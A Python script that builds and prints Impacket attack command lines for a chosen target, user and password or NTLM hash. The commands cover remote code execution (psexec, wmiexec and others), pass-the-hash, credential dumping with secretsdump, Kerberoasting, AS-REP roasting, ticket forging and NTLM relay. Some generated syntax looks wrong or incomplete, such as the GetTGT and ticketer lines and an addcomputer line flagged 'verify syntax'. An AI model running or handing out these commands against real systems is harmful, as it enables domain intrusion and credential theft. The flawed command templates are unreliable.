#!/usr/bin/env python3
"""
Impacket Command Template Generator — No save, output-only

Interactive category selection uses numbers:
  1) windows_rce
  2) smb_tools
  3) ad_kerberos
  4) kerberos_extras
  5) relay_attack
  6) rpc_tools
  7) mssql_tools
  8) ldap_tools
  9) scanning_tools
 10) all

This version does not save files and does not accept a --save flag; it only prints output.
"""
import argparse
import getpass
import sys
from datetime import datetime
from typing import List

# -------------------- Categories (expanded) --------------------------------
CATEGORIES = {
    'windows_rce': [
        'wmiexec.py', 'psexec.py', 'smbexec.py', 'atexec.py', 'dcomexec.py'
    ],
    'smb_tools': [
        'smbclient.py', 'smbpasswd.py', 'smbserver.py', 'secretsdump.py'
    ],
    'ad_kerberos': [
        'GetUserSPNs.py', 'GetTGT.py', 'GetNPUsers.py', 'ticketer.py'
    ],
    'kerberos_extras': [
        'addcomputer.py', 'getPac.py', 's4u.py'
    ],
    'relay_attack': ['ntlmrelayx.py'],
    'rpc_tools': ['rpcdump.py', 'samrdump.py', 'lookupsid.py'],
    'mssql_tools': ['mssqlclient.py'],
    'ldap_tools': ['ldapdomaindump.py', 'addcomputer.py'],
    'scanning_tools': ['sniffer.py', 'nmapAnswerMachine.py'],
    'all': []
}

# -------------------- Script applicability (target OS) ----------------------
SCRIPT_TARGET = {
    'wmiexec.py': 'windows', 'psexec.py': 'windows', 'smbexec.py': 'windows',
    'atexec.py': 'windows', 'dcomexec.py': 'windows',
    'GetUserSPNs.py': 'windows', 'GetTGT.py': 'windows',
    'GetNPUsers.py': 'windows', 'ticketer.py': 'windows',
    'addcomputer.py': 'windows', 'getPac.py': 'windows', 's4u.py': 'windows',
    'smbclient.py': 'any', 'smbpasswd.py': 'any', 'smbserver.py': 'any',
    'secretsdump.py': 'any', 'ntlmrelayx.py': 'any',
    'rpcdump.py': 'any', 'samrdump.py': 'any', 'lookupsid.py': 'any',
    'mssqlclient.py': 'any', 'ldapdomaindump.py': 'any',
    'sniffer.py': 'any', 'nmapAnswerMachine.py': 'any'
}

# -------------------- Helpers ----------------------------------------------
def normalize_hash(raw_hash: str):
    """Return (lm, nt). If NT-only provided, lm is '' (Impacket accepts ':NT')."""
    if not raw_hash:
        return None, None
    raw = raw_hash.strip()
    if ':' in raw:
        lm, nt = raw.split(':', 1)
        lm = lm or ''
        nt = nt or ''
    else:
        lm = ''
        nt = raw
    return lm.lower(), nt.lower()

def udom(domain: str, user: str):
    return f"{domain}/{user}" if domain else user

def quote_zsh(text: str):
    if text is None:
        return text
    return "'" + text.replace("'", "'\\''") + "'"

def parse_number_range_input(raw: str) -> List[str]:
    """
    Accepts strings like '1,3,5-7' and returns list of numeric strings ['1','3','5','6','7'].
    Values are returned as strings so downstream code treats them as numeric selectors.
    """
    out = []
    for part in raw.split(','):
        part = part.strip()
        if not part:
            continue
        if '-' in part:
            try:
                a, b = part.split('-', 1)
                a = int(a); b = int(b)
                if a <= 0 or b <= 0 or b < a:
                    continue
                for i in range(a, b+1):
                    out.append(str(i))
            except Exception:
                continue
        else:
            if part.isdigit():
                out.append(part)
    # dedupe while preserving order
    seen = set(); result = []
    for x in out:
        if x not in seen:
            seen.add(x); result.append(x)
    return result

# -------------------- Generators for scripts --------------------------------
def gen_wmiexec(ip, domain, user, pw, h):
    u = udom(domain, user)
    if pw:
        return f"wmiexec.py {u}:{quote_zsh(pw)}@{ip}"
    if h:
        lm, nt = normalize_hash(h)
        return f"wmiexec.py -hashes {lm}:{nt} {u}@{ip}"
    return f"wmiexec.py {u}:<PASSWORD>@{ip}"

def gen_psexec(ip, domain, user, pw, h):
    u = udom(domain, user)
    if pw:
        return f"psexec.py {u}:{quote_zsh(pw)}@{ip}"
    if h:
        lm, nt = normalize_hash(h)
        return f"psexec.py -hashes {lm}:{nt} {u}@{ip}"
    return f"psexec.py {u}:<PASSWORD>@{ip}"

def gen_smbexec(ip, domain, user, pw, h):
    u = udom(domain, user)
    if pw:
        return f"smbexec.py {u}:{quote_zsh(pw)}@{ip}"
    if h:
        lm, nt = normalize_hash(h)
        return f"smbexec.py -hashes {lm}:{nt} {u}@{ip}"
    return f"smbexec.py {u}:<PASSWORD>@{ip}"

def gen_atexec(ip, domain, user, pw, h):
    u = udom(domain, user)
    if pw:
        return f"atexec.py {u}:{quote_zsh(pw)}@{ip} whoami"
    if h:
        lm, nt = normalize_hash(h)
        return f"atexec.py -hashes {lm}:{nt} {u}@{ip} whoami"
    return f"atexec.py {u}:<PASSWORD>@{ip} whoami"

def gen_dcomexec(ip, domain, user, pw, h):
    u = udom(domain, user)
    if pw:
        return f"dcomexec.py {u}:{quote_zsh(pw)}@{ip}"
    if h:
        lm, nt = normalize_hash(h)
        return f"dcomexec.py -hashes {lm}:{nt} {u}@{ip}"
    return f"dcomexec.py {u}:<PASSWORD>@{ip}"

def gen_smbclient(ip, domain, user, pw, h):
    u = udom(domain, user)
    if pw:
        return f"smbclient.py {u}:{quote_zsh(pw)}@{ip}"
    if h:
        lm, nt = normalize_hash(h)
        return f"smbclient.py -hashes {lm}:{nt} {u}@{ip}"
    return f"smbclient.py {u}:<PASSWORD>@{ip}"

def gen_smbpasswd(ip, domain, user, pw, h):
    return f"smbpasswd.py {ip} {user}"

def gen_smbserver(ip, domain, user, pw, h):
    return "smbserver.py share /tmp/share"

# ❗ FIXED: correct secretsdump syntax (no -u)
def gen_secretsdump(ip, domain, user, pw, h):
    u = udom(domain, user)

    # Password auth
    if pw:
        return f"secretsdump.py {u}:{quote_zsh(pw)}@{ip}"

    # Hash auth -> domain/user@ip -hashes LM:NT
    if h:
        lm, nt = normalize_hash(h)
        return f"secretsdump.py {u}@{ip} -hashes {lm}:{nt}"

    return f"secretsdump.py {u}:<PASSWORD>@{ip}"

# ❗ FIXED: correct GetUserSPNs usage (target param must be last)
def gen_getuserspns(ip, domain, user, pw, h):
    u = udom(domain, user)

    if pw:
        return f"GetUserSPNs.py -request -dc-ip {ip} {u}:{quote_zsh(pw)}"

    if h:
        lm, nt = normalize_hash(h)
        return f"GetUserSPNs.py -request -dc-ip {ip} -hashes {lm}:{nt} {u}"

    return f"GetUserSPNs.py -request -dc-ip {ip} {u}:<PASSWORD>"

def gen_gettgt(ip, domain, user, pw, h):
    u = udom(domain, user)
    if pw:
        return f"GetTGT.py {u}:{quote_zsh(pw)}"
    if h:
        lm, nt = normalize_hash(h)
        return f"GetTGT.py -u {u} -hashes {lm}:{nt}"
    return f"GetTGT.py {u}:<PASSWORD>"

def gen_getnp(domain, user=None, pw=None):
    return f"GetNPUsers.py {domain or '<DOMAIN>'} -usersfile users.txt"

def gen_ticketer(user, h):
    if h:
        lm, nt = normalize_hash(h)
        return f"ticketer.py -nthash {nt} {user}"
    return f"ticketer.py -nthash <NTHASH> {user}"

def gen_ntlmrelay():
    return "ntlmrelayx.py -tf targets.txt -c whoami"

# RPC / SAMR / SID
def gen_rpcdump(ip, domain=None, user=None, pw=None, h=None):
    return f"rpcdump.py {ip}"

def gen_samrdump(ip, domain=None, user=None, pw=None, h=None):
    return f"samrdump.py {ip}"

def gen_lookupsid(ip, domain=None, user=None, pw=None, h=None):
    return f"lookupsid.py {ip}"

# MSSQL
def gen_mssqlclient(ip, domain, user, pw, h):
    u = udom(domain, user)
    if pw:
        return f"mssqlclient.py {u}:{quote_zsh(pw)}@{ip}"
    return f"mssqlclient.py {u}:<PASSWORD>@{ip}"

# LDAP / enumeration (examples)
def gen_ldapdomaindump(ip, domain, user, pw, h):
    return f"ldapdomaindump.py -u {udom(domain,user)} -p '<PASSWORD>' {ip}"

def gen_addcomputer(ip, domain, user, pw, h):
    return f"addcomputer.py {udom(domain,user)} {ip}  # verify syntax"

# Scanning / sniffing placeholders
def gen_sniffer(ip=None):
    return "sniffer.py"

def gen_nmapAnswerMachine(ip=None):
    return "nmapAnswerMachine.py"

# -------------------- Builder ----------------------------------------------
def expand_all_categories():
    all_scripts = []
    for k, v in CATEGORIES.items():
        if k == 'all':
            continue
        all_scripts.extend(v)
    # preserve order + dedupe
    seen = set(); result = []
    for s in all_scripts:
        if s not in seen:
            seen.add(s); result.append(s)
    return result

GENERATORS = {
    'wmiexec.py': gen_wmiexec,
    'psexec.py': gen_psexec,
    'smbexec.py': gen_smbexec,
    'atexec.py': gen_atexec,
    'dcomexec.py': gen_dcomexec,
    'smbclient.py': gen_smbclient,
    'smbpasswd.py': gen_smbpasswd,
    'smbserver.py': gen_smbserver,
    'secretsdump.py': gen_secretsdump,
    'GetUserSPNs.py': gen_getuserspns,
    'GetTGT.py': gen_gettgt,
    'GetNPUsers.py': lambda ip, domain, user, pw, h: gen_getnp(domain),
    'ticketer.py': lambda ip, domain, user, pw, h: gen_ticketer(user, h),
    'ntlmrelayx.py': lambda ip, domain, user, pw, h: gen_ntlmrelay(),
    'rpcdump.py': gen_rpcdump,
    'samrdump.py': gen_samrdump,
    'lookupsid.py': gen_lookupsid,
    'mssqlclient.py': gen_mssqlclient,
    'ldapdomaindump.py': gen_ldapdomaindump,
    'addcomputer.py': gen_addcomputer,
    'sniffer.py': gen_sniffer,
    'nmapAnswerMachine.py': gen_nmapAnswerMachine,
}

def build_templates(ip, user, domain, pw, h, categories, target_os):
    # Map interactive numeric selectors into category keys
    cat_keys = [k for k in CATEGORIES.keys() if k != 'all']
    cat_keys.append('all')

    resolved = []
    for c in categories:
        try:
            idx = int(c)
            if 1 <= idx <= len(cat_keys):
                resolved.append(cat_keys[idx - 1])
        except:
            # allow category names passed via CLI
            if isinstance(c, str) and c in CATEGORIES:
                resolved.append(c)

    if not resolved:
        resolved = ['all']

    if 'all' in resolved:
        scripts = expand_all_categories()
    else:
        scripts = []
        for cat in resolved:
            scripts.extend(CATEGORIES.get(cat, []))

    scripts = list(dict.fromkeys(scripts))

    output = []
    for s in scripts:
        if target_os == 'linux' and SCRIPT_TARGET.get(s) == 'windows':
            continue

        gen = GENERATORS.get(s)
        if gen:
            try:
                cmd = gen(ip, domain, user, pw, h)
            except TypeError:
                cmd = gen()
        else:
            cmd = f"# Unknown script: {s}"

        note = "  # target: Windows" if SCRIPT_TARGET.get(s) == 'windows' else "  # target: Any"
        output.append((s, cmd + note))

    return output

# -------------------- I/O / CLI -------------------------------------------
def parse_args():
    p = argparse.ArgumentParser(description='Impacket command template generator (output-only)')
    p.add_argument('--ip', help='Target IP or hostname')
    p.add_argument('--user', help='Username')
    p.add_argument('--domain', help='Domain (optional)')
    g = p.add_mutually_exclusive_group()
    g.add_argument('--password', help='Plaintext password (careful with shell quoting)')
    g.add_argument('--hash', help='LM:NT or NT-only hash string')
    p.add_argument('--categories', help='Comma-separated category names (non-interactive). Use interactive numbers for prompt.')
    p.add_argument('--target-os', choices=['windows','linux','all'], default='all', help='Target OS to tailor commands for')
    return p.parse_args()

def prompt_interactive():
    print("Interactive Impacket template generator (zsh local shell)")
    ip = input("Target IP/hostname: ").strip()
    while not ip:
        ip = input("Target IP/hostname (cannot be empty): ").strip()

    user = input("Username: ").strip()
    while not user:
        user = input("Username (cannot be empty): ").strip()

    domain = input("Domain (press Enter for none): ").strip() or None

    # --- exact numbered list requested by user ---
    print("Interactive category selection uses numbers:")
    print("  1) windows_rce")
    print("  2) smb_tools")
    print("  3) ad_kerberos")
    print("  4) kerberos_extras")
    print("  5) relay_attack")
    print("  6) rpc_tools")
    print("  7) mssql_tools")
    print("  8) ldap_tools")
    print("  9) scanning_tools")
    print(" 10) all")
    # --- end of exact block ---

    raw = input("Categories (e.g. 1,3,5 or 1-4,7) (default: 10 for 'all'): ").strip() or "10"
    categories = parse_number_range_input(raw)

    print("Credential type: 1) password  2) NTLM hash  3) none")
    ch = input("Choose: ").strip()
    while ch not in ('1','2','3'):
        ch = input("Choose 1,2 or 3: ").strip()

    pw = None
    raw_hash = None
    if ch == '1':
        pw = getpass.getpass("Password: ")
    elif ch == '2':
        raw_hash = input("NTLM hash (NT or LM:NT): ").strip()

    print("Target OS: 1) windows  2) linux  3) all")
    os_ch = input("Choose: ").strip() or '1'
    target_os = 'windows' if os_ch == '1' else ('linux' if os_ch == '2' else 'all')

    # interactive: no save prompt and no saving
    return ip, user, domain, pw, raw_hash, categories, target_os

def print_output(templates, ip, user):
    header = f"Impacket commands for {user}@{ip}  (generated {datetime.utcnow().isoformat()}Z)\n"
    lines = [header]
    for name, cmd in templates:
        lines.append('-' * 60)
        lines.append(f"Script: {name}")
        lines.append(cmd)
    output = '\n'.join(lines)
    print(output)

# -------------------- Entry point -----------------------------------------
def main():
    args = parse_args()

    # CLI non-interactive mode
    if args.ip and args.user:
        ip = args.ip
        user = args.user
        domain = args.domain
        pw = args.password
        raw_hash = args.hash
        if args.categories:
            categories = [c.strip() for c in args.categories.split(',') if c.strip()]
        else:
            categories = []
        target_os = args.target_os
        templates = build_templates(ip, user, domain, pw, raw_hash, categories, target_os)
        print_output(templates, ip, user)
        return

    # interactive mode (numbers-only categories)
    try:
        ip, user, domain, pw, raw_hash, categories, target_os = prompt_interactive()
    except KeyboardInterrupt:
        print("\nAborted by user")
        sys.exit(1)

    templates = build_templates(ip, user, domain, pw, raw_hash, categories, target_os)
    print_output(templates, ip, user)

if __name__ == '__main__':
    main()
